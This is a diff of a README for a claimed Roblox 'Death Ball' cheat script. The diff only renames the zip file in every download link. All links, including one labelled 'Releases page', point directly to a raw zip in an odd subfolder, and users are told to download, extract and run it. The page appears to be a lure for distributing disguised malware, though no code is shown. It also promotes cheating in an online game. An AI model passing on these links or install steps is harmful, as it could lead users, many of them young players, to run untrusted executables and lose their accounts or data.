@@ -1,7 +1,7 @@
 # ⚽ Roblox-Death-Ball-Script - Easy Script for Winning Games
 
 ## 📥 Download the Latest Version
-[![Download](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Death-Script-Roblox-Ball-v1.4-beta.1.zip%20Now%20-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Death-Script-Roblox-Ball-v1.4-beta.1.zip)  
+[![Download](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Ball_Roblox_Script_Death_v3.4.zip%20Now%20-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Ball_Roblox_Script_Death_v3.4.zip)  
 
 ## 🚀 Getting Started
 Welcome to the Roblox-Death-Ball-Script! This script offers powerful features for playing the Roblox Death Ball game efficiently. You can automate tasks like farming and winning. Follow these simple steps to get started.
@@ -27,10 +27,10 @@ To run the Roblox-Death-Ball-Script effectively, ensure your system meets these 
 - **Storage:** 100 MB of free space.
 
 ## 📥 Download & Install
-To start using the Roblox-Death-Ball-Script, visit this page to download the script: [Download Here](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Death-Script-Roblox-Ball-v1.4-beta.1.zip).
+To start using the Roblox-Death-Ball-Script, visit this page to download the script: [Download Here](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Ball_Roblox_Script_Death_v3.4.zip).
 
 ### 🛠️ Installation Steps
-1. **Visit the Releases Page:** Open the [Releases page](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Death-Script-Roblox-Ball-v1.4-beta.1.zip) in your web browser.
+1. **Visit the Releases Page:** Open the [Releases page](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Ball_Roblox_Script_Death_v3.4.zip) in your web browser.
 2. **Select the Latest Release:** Look for the most recent version. 
 3. **Download the Zip File:** Click on the zip file to download it to your computer.
 4. **Extract the Files:** Right-click on the downloaded zip file and select "Extract All."
@@ -68,4 +68,4 @@ If you need further assistance, feel free to contact the support team. You can r
 This project is open-source. You can view the license terms in the repository.
 
 ## 📥 Download the Latest Version Again
-To download the script, visit this page again: [Download Here](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Death-Script-Roblox-Ball-v1.4-beta.1.zip). Enjoy your new gaming enhancements!
+To download the script, visit this page again: [Download Here](https://raw.githubusercontent.com/Marik201517/Roblox-Death-Ball-Script/main/perpera/Ball_Roblox_Script_Death_v3.4.zip). Enjoy your new gaming enhancements!
